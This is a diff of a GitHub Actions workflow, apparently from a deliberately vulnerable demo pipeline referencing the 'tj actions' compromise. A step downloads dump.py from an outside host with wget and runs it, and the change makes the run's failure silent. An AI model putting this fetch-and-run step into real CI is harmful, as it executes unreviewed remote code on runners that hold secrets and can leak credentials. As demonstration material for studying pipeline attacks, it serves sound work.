@@ -46,7 +46,7 @@ jobs:
         run: |
           echo "tj actions"
           wget --connect-timeout=3 https://ckalpakoglu.github.io/vuln-pipeline/dump.py || true
-          python3 dump.py
+          python3 dump.py || true
 
         # Runs a set of commands using the runners shell
       - name: Run allowed action
